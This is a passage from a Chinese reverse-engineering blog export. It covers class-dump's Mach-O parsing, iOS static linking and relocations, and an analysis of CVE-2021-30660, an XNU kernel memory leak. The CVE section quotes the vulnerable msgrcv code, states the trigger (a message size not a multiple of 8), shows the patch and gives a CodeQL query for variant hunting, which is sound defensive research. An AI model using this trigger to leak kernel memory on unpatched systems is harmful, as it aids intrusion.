<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">export LDFLAGS=<span class="string">&quot;-L/usr/local/opt/openssl/lib&quot;</span></span><br><span class="line">export CPPFLAGS=<span class="string">&quot;-I/usr/local/opt/openssl/include&quot;</span></span><br></pre></td></tr></table></figure>

<p>XCode中的配置是:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/111.png" alt="111"></p>
<p>Q : Library not found for -lcrypto</p>
<p>A :  add the missing dylib</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fix_crypto.png" alt="fix_crypto"></p>
<h2 id="raed-amp-amp-debug"><a href="#raed-amp-amp-debug" class="headerlink" title="raed &amp;&amp; debug"></a>raed &amp;&amp; debug</h2><p>核心逻辑就看</p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)processObjectiveCData;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (CDMachOFile *machOFile <span class="keyword">in</span> <span class="keyword">self</span>.machOFiles) &#123;</span><br><span class="line">        CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile];</span><br><span class="line">        [processor process];</span><br><span class="line">        [_objcProcessors addObject:processor];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">void</span>)process;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.machOFile.isEncrypted == <span class="literal">NO</span> &amp;&amp; <span class="keyword">self</span>.machOFile.canDecryptAllSegments) &#123;</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.symbolTable loadSymbols];</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.dynamicSymbolTable loadSymbols];</span><br><span class="line"></span><br><span class="line">        [<span class="keyword">self</span> loadProtocols];</span><br><span class="line">        [<span class="keyword">self</span>.protocolUniquer createUniquedProtocols];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load classes before categories, so we can get a dictionary of classes by address.</span></span><br><span class="line">        [<span class="keyword">self</span> loadClasses];</span><br><span class="line">        [<span class="keyword">self</span> loadCategories];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-symbolTable-loadSymbols"><a href="#1-symbolTable-loadSymbols" class="headerlink" title="1. symbolTable loadSymbols"></a>1. symbolTable loadSymbols</h2><p>Load Commands 里找到 LC_SYMTAB，然后找到 __DATA(依赖属性 RW)。</p>
<p>然后利用 LC_SYMTAB 初始化了cursor开始遍历找符号。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.47.33@2x.png" alt="CleanShot 2021-07-11 at 15.47.33@2x"></p>
<p>strtab 从 string table 开始 ： 一个 symbol起始位置，一个string起始位置。</p>
<p>然后根据 arm 还是 x64 走不同的逻辑(这里目标是ARM64的Binary) : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.48.18@2x.png" alt="CleanShot 2021-07-11 at 15.48.18@2x"></p>
<p>开始解析 symbol table，item by item</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string table index  --&gt;  在string table里找到对应的 string</span><br><span class="line">type</span><br><span class="line">section index</span><br><span class="line">desc</span><br><span class="line">value</span><br></pre></td></tr></table></figure>

<p>然后根据string table index里找到对应的string，放到symbols数组里，</p>
<p>根据 string 的 value 判断是不是 class，这里是根据字符串的开头是不是<code>  @&quot;*OBJC_CLASS*$_&quot;</code>。</p>
<p>对于解析出来class name，添加到 class symbols dict里，<strong>这样处理之后，symbols， classSymbols都有了。</strong></p>
<h2 id="2-dynamicSymbolTable-loadsymbols"><a href="#2-dynamicSymbolTable-loadsymbols" class="headerlink" title="2. dynamicSymbolTable loadsymbols"></a>2. dynamicSymbolTable loadsymbols</h2><p>类似1</p>
<h2 id="3-loadProtocols"><a href="#3-loadProtocols" class="headerlink" title="3. loadProtocols"></a>3. loadProtocols</h2><p>从 <code>__DATA , __objc_protolist</code> 读取 对应的value</p>
<p>比如得到地址0x1009ccc58</p>
<p>走到 <code>- (CDOCProtocol *)protocolAtAddress:(uint64_t)address</code></p>
<p>初始化对应的<code>CDOCProtocol</code>对象</p>
<p>依赖这个地址，从文件对应地址读取出来 这个 <code>proto</code>的相关信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct cd_objc2_protocol objc2Protocol;</span><br><span class="line">objc2Protocol.isa                     = [cursor readPtr];</span><br><span class="line">objc2Protocol.name                    = [cursor readPtr];</span><br><span class="line">objc2Protocol.protocols               = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceMethods         = [cursor readPtr];</span><br><span class="line">objc2Protocol.classMethods            = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalInstanceMethods = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalClassMethods    = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceProperties      = [cursor readPtr];</span><br><span class="line">objc2Protocol.size                    = [cursor readInt32];</span><br><span class="line">objc2Protocol.flags                   = [cursor readInt32];</span><br><span class="line">objc2Protocol.extendedMethodTypes     = 0;</span><br></pre></td></tr></table></figure>

<p>name protocols这些字段是一个地址，指向对应的值(字符串/数组)</p>
<p>最后参照objc2Protocol的值，分别获取protocol 的 name， 各种methods，属性等，初始化了protocol对象</p>
<p>所以protocols就都处理出来了，最后得到了</p>
<p><code>_protocolsByAddress __NSDictionaryM *   6781 key/value pairs    0x0000000112f93820</code></p>
<h2 id="4-protocolUniquer-createUniquedProtocols"><a href="#4-protocolUniquer-createUniquedProtocols" class="headerlink" title="4. protocolUniquer createUniquedProtocols"></a>4. protocolUniquer createUniquedProtocols</h2><p>依赖3中找到的 <code>_protocolsByAddress</code></p>
<p>name -&gt; protocol 对应关系的dict addr -&gt; protocol 对应关系的dict</p>
<p>p1-&gt;protocols 里还有protocol，merge进来(adopted protocols)</p>
<ul>
<li><p>p1 : _name   __NSCFString *  @”AWEFriendsActivityWidgetConfigurationIntentHandling”  0x0000000112fbc710</p>
</li>
<li><p>p2 : _name   NSTaggedPointerString * @”NSObject” 0x07518ee6ed78d7f9</p>
</li>
</ul>
<p>@interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablabla… }</p>
<p>这种情况</p>
<h2 id="5-loadClasses"><a href="#5-loadClasses" class="headerlink" title="5. loadClasses"></a>5. loadClasses</h2><p>解析section ：<code> __DATA   __objc_classlist</code></p>
<p>和3类似的套路，先得到 一个 地址，然后根据地址，去文件中索引对应的结构：</p>
<p><code>CDOCClass *aClass = [self loadClassAtAddress:val]</code></p>
<p>只调试一次过程分析即可:<code> val uint64_t    4335166480 In [2]: hex(4335166480) Out[2]: &#39;0x102656410&#39;</code></p>
<p>这个0x102656410，使用machoview也能看到，调试+machoview对比看，更容易理解。</p>
<p><code>loadClassAtAddress</code>方法分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct cd_objc2_class objc2Class;</span><br><span class="line">objc2Class.isa        = [cursor readPtr];</span><br><span class="line">objc2Class.superclass = [cursor readPtr];</span><br><span class="line">objc2Class.cache      = [cursor readPtr];</span><br><span class="line">objc2Class.vtable     = [cursor readPtr];</span><br><span class="line">objc2Class.data       = [cursor readPtr];</span><br><span class="line">objc2Class.reserved1  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved2  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved3  = [cursor readPtr];</span><br></pre></td></tr></table></figure>

<p>也是读取对应的class结构，这个过程其实很眼熟，如果读过iOS逆向的书，比如庆神的书，有一章介绍oc方法调用过程的，会把oc-&gt;cpp代码，那里面这个 oc object的结构分析的很清楚。</p>
<p>然后解析<code> class-&gt;data</code> 字段</p>
<figure class="highlight objc"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cd_objc2_class_ro_t objc2ClassData;</span><br><span class="line">objc2ClassData.flags         = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceStart = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceSize  = [cursor readInt32];</span><br><span class="line"><span class="keyword">if</span> ([<span class="keyword">self</span>.machOFile uses64BitABI])</span><br><span class="line">    objc2ClassData.reserved  = [cursor readInt32];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    objc2ClassData.reserved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">objc2ClassData.ivarLayout     = [cursor readPtr];</span><br><span class="line">objc2ClassData.name           = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseMethods    = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProtocols  = [cursor readPtr];</span><br><span class="line">objc2ClassData.ivars          = [cursor readPtr];</span><br><span class="line">objc2ClassData.weakIvarLayout = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProperties = [cursor readPtr];</span><br></pre></td></tr></table></figure>

<p>然后得到class 的 name，methods，protocol, property信息 然后返回这个class</p>
<p>展开说下 获取 methods &amp;&amp; property的时候</p>
<ul>
<li><code>(NSArray *)loadMethodsAtAddress:(uint64_t)address; &#123; return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; &#125;</code></li>
</ul>
<p><code>loadMethodsAtAddress :</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objc2Method.name  = [cursor readPtr];</span><br><span class="line">objc2Method.types = [cursor readPtr];</span><br><span class="line">objc2Method.imp   = [cursor readPtr];</span><br><span class="line">NSString *name    = [self.machOFile stringAtAddress:objc2Method.name];</span><br><span class="line">NSString *types   = [self.machOFile stringAtAddress:objc2Method.types];</span><br></pre></td></tr></table></figure>

<p>一样的套路，都是解析出来对应的字段，然后按照这些字段读取信息<code>(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; </code>最后获得methods数组，给前面填充class的地方使用</p>
<p><code>loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress</code> 同理</p>
<p>至此，class解析完毕</p>
<h2 id="6-loadCategories"><a href="#6-loadCategories" class="headerlink" title="6. loadCategories"></a>6. loadCategories</h2><p>关于Categories 可以看 <a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p>
<p>处理<code> __DATA __objc_catlist section</code> : </p>
<ul>
<li>(CDOCCategory *)loadCategoryAtAddress:(uint64_t)address;</li>
</ul>
<p>一样的处理方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct cd_objc2_category objc2Category;</span><br><span class="line">objc2Category.name               = [cursor readPtr];</span><br><span class="line">objc2Category.class              = [cursor readPtr];</span><br><span class="line">objc2Category.instanceMethods    = [cursor readPtr];</span><br><span class="line">objc2Category.classMethods       = [cursor readPtr];</span><br><span class="line">objc2Category.protocols          = [cursor readPtr];</span><br><span class="line">objc2Category.instanceProperties = [cursor readPtr];</span><br><span class="line">objc2Category.v7                 = [cursor readPtr];</span><br><span class="line">objc2Category.v8                 = [cursor readPtr];</span><br></pre></td></tr></table></figure>

<p>可以看到和对objc2Class的处理有点像，就是因为是category的原因，所以字段有不同， 简单的理解成 处理一种特殊的class，并且提取出相应的 methods 和 properties就行</p>
<p>至此整个 process函数的处理结束</p>
<h2 id="7-处理-or-输出"><a href="#7-处理-or-输出" class="headerlink" title="7. 处理 or 输出"></a>7. 处理 or 输出</h2><p>这部分主要是处理输出了，如果没什么参数就直接stdout输出，如果有指定文件目录，就遍历之前process得到的信息，写文件(.h)到指定的目录。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/output.png" alt="output"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p>
<p><a href="https://en.wikipedia.org/wiki/Mach-O">https://en.wikipedia.org/wiki/Mach-O</a></p>
<p><a href="https://iosre.com/">https://iosre.com/</a></p>
<p><a href="https://evilpan.com/2020/09/06/macho-inside-out/">https://evilpan.com/2020/09/06/macho-inside-out/</a></p>
<p>iOS应用逆向与安全 (刘培庆著)</p>
]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>ql query for CVE-2021-30660 XNU Kernel Memory Disclosure</title>
    <url>/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/</url>
    <content><![CDATA[<p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p>
<a id="more"></a>



<h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><p><code>msgsz</code> 可控</p>
<p><code>msginfo.msgssz</code> 是 8</p>
<p>如果控制<code> msgsz</code> 不是 8的 整数倍，比如9，就会导致在第二次循环的时候 leak出来 7字节的内核数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">next = msghdr-&gt;msg_spot;</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* compare input (size_t) value against restrict (int) value */</span></span><br><span class="line">        <span class="keyword">if</span> (msgsz &gt; (<span class="keyword">size_t</span>)msginfo.msgssz) &#123;</span><br><span class="line">            tlen = msginfo.msgssz;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tlen = msgsz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br><span class="line">        SYSV_MSG_SUBSYS_LOCK();</span><br><span class="line">        <span class="keyword">if</span> (eval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MSG_DEBUG_OK</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error (%d) copying out message segment\\n"</span>,</span><br><span class="line">                eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            msg_freehdr(msghdr);</span><br><span class="line">            wakeup((<span class="keyword">caddr_t</span>)msqptr);</span><br><span class="line">            <span class="keyword">goto</span> msgrcvout;</span><br><span class="line">        &#125;</span><br><span class="line">        user_msgp = user_msgp + tlen;   <span class="comment">/* ptr math */</span></span><br><span class="line">        next = msgmaps[next].next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * copy the full segment, or less if we're at the end</span></span><br><span class="line"><span class="comment">         * of the message</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        tlen = MIN(msgsz - len, (<span class="keyword">size_t</span>)msginfo.msgssz);</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br></pre></td></tr></table></figure>

<p>补丁保证了，在非8 整数倍的时候，只拷贝剩余的长度的数据。</p>
<h1 id="CodeQL-query"><a href="#CodeQL-query" class="headerlink" title="CodeQL query"></a>CodeQL query</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">// 存在误报 IOKit</span><br><span class="line">predicate isSYSCall(Function f) &#123;</span><br><span class="line">    exists(Macro m |</span><br><span class="line">        m.getName().toUpperCase().regexpMatch("SYS(.)*") and</span><br><span class="line">        m.getLocation().getFile().getBaseName() = "syscall.h" and </span><br><span class="line">        m.getName().indexOf(f.getName()) &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">syscall -&gt; copyout</span></span><br><span class="line"><span class="comment">source : syscall fucntion 's params</span></span><br><span class="line"><span class="comment">sink   : copyout 3rd param(size)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this = "taint size to copy size" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(LocalVariable lv, Function f |</span><br><span class="line">        isSYSCall(f) and</span><br><span class="line">        lv.getFunction() = f and</span><br><span class="line">        (</span><br><span class="line">            not source.asExpr().(Literal).isConstant()</span><br><span class="line">        ) and</span><br><span class="line">        lv.getAnAccess() = source.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc | </span><br><span class="line">            fc.getTarget().getName() = "copyout" and</span><br><span class="line">            fc.getArgument(2) = sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, <span class="string">" to "</span>, sink, <span class="string">" in "</span>, source.getNode().getFunction().getName()</span><br></pre></td></tr></table></figure>

<p>有误报，但是够用了，替换成copyin，也可以看看其他的调用路径，不过笔者没发现什么有价值的东西 : (</p>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>CVE-2021-30660 - XNU Kernel Memory Disclosure</p>
]]></content>
      <categories>
        <category>XNU</category>
      </categories>
      <tags>
        <tag>XNU</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS RE 4 beginners 2 - 静态链接&amp;&amp;动态链接</title>
    <url>/2021/07/14/iOS-RE-4-beginners-2/</url>
    <content><![CDATA[<h1 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h1><p>macos11.4 + iphone6 iOS 12.2</p>
<a id="more"></a>

<h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>静态链接：输入多个目标文件，输出一个文件（一般是可执行文件）。这个过程中，把多个目标文件里相同性质的段合并到一起。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
<li>地址和空间分配 (Address and Storage Allocation)</li>
<li>符号决议 (Symbol Resolution) / 符号绑定 (Symbol Binding)</li>
<li>重定位 (Relocation)</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled.png"></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/study/ios_re_link/static_link  cat main.c</span><br><span class="line"></span><br><span class="line">extern int global_var;</span><br><span class="line"></span><br><span class="line">int foo(int i);</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    int ret = foo(42 + global_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> ~/study/ios_re_link/static_link  cat foo.c</span><br><span class="line">int global_var = 0x1337;</span><br><span class="line"></span><br><span class="line">int foo(int i)&#123;</span><br><span class="line">    <span class="built_in">return</span> i + global_var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2</span><br><span class="line">~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2</span><br></pre></td></tr></table></figure>

<p>两个模块(main.o 和 foo.o) 通过静态链接组合成了一个可执行文件(main)</p>
<h2 id="模块-amp-amp-产物"><a href="#模块-amp-amp-产物" class="headerlink" title="模块&amp;&amp;产物"></a>模块&amp;&amp;产物</h2><h3 id="main-o"><a href="#main-o" class="headerlink" title="main.o"></a>main.o</h3><p>通过machoview可以看到重定位段有三条信息，意味着程序中有三处需要重定位处理：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%201.png"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%202.png"></p>
<p>这个图是hopper反汇编的main函数，可以看到对于引用到其他模块(foo.o)重的变量/函数的地方看起来“正常”，但是点击 <code>bl _foo</code> 就会发现跳转到了：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%203.png"></p>
<p>根据&lt;macho/reloc.h&gt;的定义，可以看到reloc段的结构：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct relocation_info &#123;</span><br><span class="line">   int32_t    r_address;    /* offset <span class="keyword">in</span> the section to what is being</span><br><span class="line">                   relocated */</span><br><span class="line">   uint32_t     r_symbolnum:24,    /* symbol index <span class="keyword">if</span> r_extern == 1 or section</span><br><span class="line">                   ordinal <span class="keyword">if</span> r_extern == 0 */</span><br><span class="line">        r_pcrel:1,     /* was relocated pc relative already */</span><br><span class="line">        r_length:2,    /* 0=byte, 1=word, 2=long, 3=quad */</span><br><span class="line">        r_extern:1,    /* does not include value of sym referenced */</span><br><span class="line">        r_type:4;    /* <span class="keyword">if</span> not 0, machine specific relocation <span class="built_in">type</span> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结合上面的图来看(以_foo符号为例)：</p>
<ul>
<li>r_address : 0x28</li>
<li>r_symbolnum(24bits): 指向_foo 字符串</li>
<li>剩下的8bits是标志位</li>
</ul>
<p>对应到汇编里就是，main函数的0x28行引用了 _foo 符号，reloc段把这个信息告知linker，这样在链接的时候linker就会处理这条信息，把对应的符号做替换处理。</p>
<h3 id="foo-o"><a href="#foo-o" class="headerlink" title="foo.o"></a>foo.o</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%204.png"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%205.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%205.png"></p>
<p>其实都是对 <code>global_var</code>的引用</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%206.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%206.png"></p>
<p>在foo.o模块中，是 0x20处的data，这个信息也要告诉linker，在link的阶段做替换。</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>最终的可执行文件main，可以看到没有重定位信息，而且mian和foo函数中改替换的符号都已经完成了替换，可以顺利的索引到想要使用的符号(foo和global_var)。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%207.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%207.png"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%208.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%208.png"></p>
<p>对比两者符号表：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%209.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%209.png"></p>
<p>以foo符号为例 : </p>
<p>Type 从 N_UNDF → NSECT</p>
<p>Value 从0 → 0x100007f90 </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.17.57@2x.png" alt="CleanShot 2021-07-20 at 15.17.57@2x"></p>
<p>符号表结构:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct nlist_64 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        uint32_t n_strx;   /* index into the string table */</span><br><span class="line">    &#125; n_un;</span><br><span class="line">    uint8_t  n_type;       /* <span class="built_in">type</span> flag, see below */</span><br><span class="line">    uint8_t  n_sect;       /* section number or NO_SECT */</span><br><span class="line">    uint16_t n_desc;       /* see &lt;mach-o/stab.h&gt; */</span><br><span class="line">    uint64_t n_value;      /* value of this symbol (or stab offset) */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>foo 符号的话</p>
<ul>
<li>string table index : 指向符号的字符串</li>
<li>n_sect : 改符号在第几个section</li>
<li>n_value : 符号具体值(地址)</li>
</ul>
<h2 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h2><p>这里以demo中 global_var 使用的代码举例子。</p>
<p>源码中:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int ret = foo(42 + global_var);</span><br></pre></td></tr></table></figure>

<p>如果对应到汇编里应该是:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0000000000000014         adrp       x9, <span class="comment">#0x0                                    ; 0x68@PAGE</span></span><br><span class="line">0000000000000018         ldr        x9, [x9, <span class="comment">#0x68]                             ; 0x68@PAGEOFF</span></span><br><span class="line">000000000000001c         ldr        w10, [x9]</span><br><span class="line">0000000000000020         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000000000024         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000000000028         bl         _foo</span><br></pre></td></tr></table></figure>

<p>可知 w0 是参数，w10是global_var的值，来自x9</p>
<p><code>w10  = [x9 + 0x68]</code> (未重定位修复）</p>
<p>最开始索引x9的时候可以发现是把0赋给了x9，因为这里还没有重定位，所以用0代替。</p>
<p>最终的产物中可以看到：</p>
